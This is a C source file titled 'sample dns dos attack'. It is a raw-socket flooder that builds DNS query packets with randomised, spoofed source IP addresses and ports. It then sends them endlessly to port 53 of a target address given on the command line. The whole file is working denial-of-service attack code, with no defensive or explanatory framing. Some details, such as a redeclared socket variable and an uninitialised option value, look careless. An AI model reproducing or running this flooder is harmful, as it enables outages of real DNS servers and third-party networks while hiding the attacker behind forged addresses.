/*********************
sample dns dos attack
*********************/
#include<arpa/nameser.h>
#include<stdio.h>
#include<sys/types.h>
#include<string.h>
#include<sys/socket.h>
#include<unistd.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<time.h>
#include<netinet/ip.h>
#include<netdb.h>
#include<arpa/inet.h>
/* Define to 1 if the native W32 API should be used. */
#if (defined _WIN32 || defined __WIN32__) && !defined __CYGWIN__
#define W32_NATIVE 1
#endif
#ifdef W32_NATIVE
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0502
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#endif



struct ipheader					 //ip header
{
	unsigned char ip_hl:4,ip_v:4;//
	unsigned char ip_tos;        //
	unsigned short int ip_len;   //
	unsigned short int ip_id;    //
	unsigned short int ip_off;   //
	unsigned char ip_ttl;	     //
	unsigned char ip_p;	     //
	unsigned short int ip_sum;   //
	unsigned int ip_src;	     //
	unsigned int ip_dst;	    //
};
struct udpheader				 //udp header
{
	unsigned short int port_src; //
	unsigned short int port_dst; //
	unsigned short int udp_len;  //
	unsigned short int udp_sum;  //
};
struct dns_msg					//send bag
{
	struct ipheader ip;         //ip
	struct udpheader udp;		//udp
	HEADER dnshead;				//dns
	char dnsbuf[100];			//udp
};
u_short checksum(u_short *addr,int len)//
{ 
	u_int32_t sum=0;  
	u_int16_t *ad=addr,result; 
	while(len>1)			
	{        
		sum+=*ad++;				//
		len-=2; 
	} 
	sum=(sum>>16)+(sum&0xffff); //
	sum+=(sum>>16);				
	result=~sum;				//
	return(result);
}
int main(int argc,char **argv)
{ 
        int sockfd;
	int ord;
	int i,j,k;
	int num=0;
	struct sockaddr_in my_addr;
	struct dns_msg dns_data;//send bag
	srand(time(NULL));
   
        #ifdef W32_NATIVE
        WSADATA W;
        SOCKET sockfd;
        WSAStartup (0x101, &W);
        #else
        #endif
        #ifdef W32_NATIVE
        WSADATA WSAData;
        WSAStartup(MAKEWORD(2, 2), &WSAData);
        #else
        #endif
	
        if(argc!=2)
	{
		printf("agrc!=2 agrc =attack dst ip \n");
		exit(0);
	}
	if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0)//
	{
		printf("socket err\n");
		exit(0);
	} 
	if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&ord,sizeof(ord))<0)//
	{
		printf("setsockopt err");
		exit(0);
	}
	my_addr.sin_addr.s_addr=inet_addr(argv[1]); //
	my_addr.sin_family=AF_INET;
	my_addr.sin_port=htons(53);
	/*sample construct boucle*/
	for(i=97;i<123;i++)
		for(j=97;j<123;j++)
			for(k=97;k<123;k++)
			{
				i=97;j=97;k=97;
				printf("%d\n",num);
				num++;
				bzero(&dns_data,sizeof(struct dns_msg));
				//fill  ip head
				dns_data.ip.ip_v=4;
				dns_data.ip.ip_hl=(sizeof(struct ip)/4);
				dns_data.ip.ip_tos=0;
				dns_data.ip.ip_len=sizeof(dns_data);
				dns_data.ip.ip_id=random();
				dns_data.ip.ip_off=0;
				dns_data.ip.ip_ttl=255;
				dns_data.ip.ip_p=IPPROTO_UDP;
				dns_data.ip.ip_sum=0;
				dns_data.ip.ip_dst=my_addr.sin_addr.s_addr;
				dns_data.ip.ip_src=random();	
				//fill  udp head
				dns_data.udp.port_dst=htons(53);
				dns_data.udp.port_src=htons(1024+(rand()%2000));//
				dns_data.udp.udp_len=htons(31);//htons(sizeof(struct dns_msg)-sizeof(struct ipheader));
				dns_data.udp.udp_sum=0;
				//fill  dns head
				dns_data.dnshead.id=random();
				dns_data.dnshead.rd=0;
				dns_data.dnshead.ra=1;//
				dns_data.dnshead.aa=0;//
				dns_data.dnshead.tc=0; //
				dns_data.dnshead.opcode=QUERY;//
				dns_data.dnshead.qdcount=htons(1);//
				dns_data.dnshead.ancount=htons(0);//
				dns_data.dnshead.nscount=htons(0);//
				dns_data.dnshead.arcount=htons(0);//
				dns_data.dnshead.qr=0;//query bag
				//fill domain query
				dns_data.dnsbuf[0]=1;
				dns_data.dnsbuf[1]=i;
				dns_data.dnsbuf[2]=1;
				dns_data.dnsbuf[3]=j;
				dns_data.dnsbuf[4]=1;
				dns_data.dnsbuf[5]=k;
				dns_data.dnsbuf[6]=0;
				dns_data.dnsbuf[8]=1;
				dns_data.dnsbuf[10]=1;
				dns_data.dnshead.id=random();							
				//fill checksum
				u_char *pseudo,pseudoHead[44];//
				bzero(pseudoHead,44);
				pseudo=pseudoHead;
				memcpy(pseudo,&(dns_data.ip.ip_src),8);
				pseudo+=9; 
				memcpy(pseudo,&(dns_data.ip.ip_p),1);
				pseudo++;
				memcpy(pseudo,&(dns_data.udp.udp_len),2);
				pseudo+=2;
				memcpy(pseudo,&(dns_data.udp),sizeof(struct udpheader));
				pseudo+=8;
				memcpy(pseudo,&(dns_data.dnshead),sizeof(HEADER));
				pseudo+=12;
				memcpy(pseudo,&(dns_data.dnsbuf),11);//strlen(dns_data.dnsbuf));
				dns_data.udp.udp_sum=checksum((u_short *)pseudoHead,44);
				sendto(sockfd,&dns_data,51,0,(struct sockaddr *)&my_addr,sizeof(struct sockaddr_in));//
			}
}


